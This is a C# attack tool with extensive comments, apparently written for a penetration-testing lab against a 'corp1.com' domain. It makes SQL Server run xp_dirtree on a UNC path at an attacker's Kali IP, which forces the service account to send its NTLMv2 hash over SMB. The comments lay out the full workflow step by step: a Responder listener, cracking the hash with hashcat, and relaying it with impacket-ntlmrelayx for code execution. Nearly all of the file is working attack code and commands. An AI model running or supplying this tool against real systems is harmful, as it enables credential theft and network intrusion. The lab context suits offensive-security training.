// ================================================================
// smb_trigger.cs — Force SQL Server NTLM Authentication to Kali (Hash Capture)
// ================================================================
// WHAT THIS DOES:
//   Connects to a SQL Server using Windows Integrated Authentication, then
//   executes xp_dirtree with a UNC path pointing to your Kali machine.
//   This forces the SQL Server service account to attempt NTLM authentication
//   to your Responder/Impacket listener, capturing the NTLMv2 hash.
//   You can then crack the hash offline or relay it for code execution.
//
// TARGET: Windows SQL Server (any version 2008-2022)
// RESULT: Capture DC01$ / SQL service account NTLMv2 hash
//
// HOW IT WORKS:
//   xp_dirtree is an undocumented SQL Server extended procedure that
//   enumerates a file path. When given a UNC path (\\IP\share), SQL
//   Server resolves it over SMB, triggering NTLM authentication from
//   the SQL Server service account to your attacker machine.
//   Even if the share doesn't exist, the NTLM handshake fires.
//
// ----------------------------------------------------------------
// BEFORE YOU RUN — CHANGE THESE VALUES
// ----------------------------------------------------------------
//   string sqlServer  = "dc01.corp1.com"   -> SQL Server FQDN or IP
//   string database   = "master"           -> usually leave as "master"
//   string attackerIp = "192.168.45.196"   -> YOUR Kali IP (where Responder runs)
//   string fakeShare  = "test"             -> any name (doesn't need to exist)
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows, .NET Framework):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /out:smb_trigger.exe smb_trigger.cs
//     (No /unsafe needed — just standard ADO.NET)
//
//   OPTION B — dotnet CLI (cross-platform):
//     dotnet new console -n smb_trigger
//     (replace Program.cs with this file)
//     dotnet publish -c Release -r win-x64 --self-contained \
//       -p:PublishSingleFile=true
//     (produces a single self-contained .exe in publish\ folder)
//
//   OPTION C — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "smb_trigger", Framework: .NET Framework 4.x, click Create
//     3. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     4. Build -> Build Solution (Ctrl+Shift+B)
//     5. Find: bin\Debug\smb_trigger.exe
//
// ----------------------------------------------------------------
// RUN — COMPLETE ATTACK WORKFLOW
// ----------------------------------------------------------------
//
//   STEP 1 — Start Responder on Kali:
//     sudo responder -I eth0 -v
//     (Responder listens for SMB auth on all interfaces)
//
//   STEP 2 — Run smb_trigger.exe on the victim (or from your attack machine
//            if you have network access to the SQL server):
//     smb_trigger.exe
//     (uses Integrated Security = the user running the tool)
//
//   STEP 3 — Responder captures the NTLMv2 hash:
//     [SMB] NTLMv2-SSP Client   : 192.168.x.x
//     [SMB] NTLMv2-SSP Hash     : DC01$::CORP1:xxxxxxx...
//
//   STEP 4 — Crack the hash:
//     hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
//
//   STEP 5 (alternative) — Relay instead of crack:
//     Use impacket-ntlmrelayx instead of Responder to relay the
//     hash directly for code execution:
//       impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support
//
// BEFORE RUNNING, CHANGE:
//   - sqlServer  -> your target SQL Server FQDN or IP
//   - attackerIp -> your Kali IP
// ================================================================

using System;                // Required for Console, Environment
using System.Data.SqlClient; // ADO.NET SQL Client (built-in to .NET)

// Namespace to avoid global pollution and allow easy copy-paste
namespace SQL
{
    // Entry-class name must contain Main()
    internal class Program
    {
        // ─────────────────────────────────────────────────────────────────────
        //  MAIN ENTRY POINT
        // ─────────────────────────────────────────────────────────────────────
        private static void Main(string[] args)
        {
            // ┌─ TARGET CONFIGURATION ────────────────────────────────────────┐
            // │ Change these two lines to match your lab environment         │
            // └───────────────────────────────────────────────────────────────┘
            string sqlServer = "dc01.corp1.com";   // FQDN or IP of the SQL Server
            string database  = "master";           // System DB that owns xp_dirtree

            // ┌─ CONNECTION STRING ──────────────────────────────────────────┐
            // │ Integrated Security = True → uses the SQL Service account   │
            // │ On a Domain Controller this is NT AUTHORITY\SYSTEM          │
            // │ On member servers it is the service account (often DA priv)│
            // └───────────────────────────────────────────────────────────────┘
            string conString =
                $"Server={sqlServer};Database={database};Integrated Security=True;";

            // Create the ADO.NET connection object
            using SqlConnection con = new SqlConnection(conString);

            // ┌─ AUTHENTICATION TEST ────────────────────────────────────────┐
            // │ Try to open the connection. If it fails we exit early.      │
            // └───────────────────────────────────────────────────────────────┘
            try
            {
                con.Open();                               // <-- SQL login here
                Console.WriteLine("[+] Auth success!");   // Visual confirmation
            }
            catch (Exception ex)
            {
                // Any failure (wrong server, no rights, firewall, etc.)
                Console.WriteLine($"[-] Auth failed: {ex.Message}");
                Environment.Exit(1);   // Non-zero = script failure for automation
            }

            // ┌─ SMB RELAY PAYLOAD ──────────────────────────────────────────┐
            // │ xp_dirtree is an undocumented XP that enumerates a UNC path │
            // │ SQL Server resolves \\IP\share → initiates SMB handshake    │
            // │ Even a non-existent share triggers NTLM auth from the      │
            // │ SQL Server service account to your attacker IP              │
            // └───────────────────────────────────────────────────────────────┘
            string attackerIp   = "192.168.45.196";   // <-- YOUR KALI IP
            string fakeShare    = "test";             // Folder created with Responder
            string uncPath      = $"\\\\{attackerIp}\\{fakeShare}";

            string payloadQuery = $"EXEC master..xp_dirtree '{uncPath}';";

            // Build and execute the command
            using SqlCommand cmd = new SqlCommand(payloadQuery, con);

            // ExecuteNonQuery() is enough; we do not care about results
            // The SMB connection fires the instant SQL parses the UNC path
            try
            {
                SqlDataReader reader = cmd.ExecuteReader();
                reader.Close();  // Clean disposal
                Console.WriteLine($"[+] xp_dirtree executed → SMB request sent to {uncPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Query error (still OK): {ex.Message}");
            }

            // ┌─ CLEAN EXIT ─────────────────────────────────────────────────┐
            // │ Close SQL handle gracefully (releases network socket)       │
            // └───────────────────────────────────────────────────────────────┘
            con.Close();
            Console.WriteLine("[*] Done. Check Responder for DC01$ hash.");
        }
    }
}

// ═════════════════════════════════════════════════════════════════════════════
//  QUICK LAB CHEAT-SHEET
//  1. Kali: mkdir /tmp/test ; sudo responder -I eth0 -v
//  2. Windows victim → copy SQL.exe → SQL.exe
//  3. Kali terminal → [+] NTLMv2 hash captured
//  4. Crack: hashcat -m 5600 hash.txt rockyou.txt
// ═════════════════════════════════════════════════════════════════════════════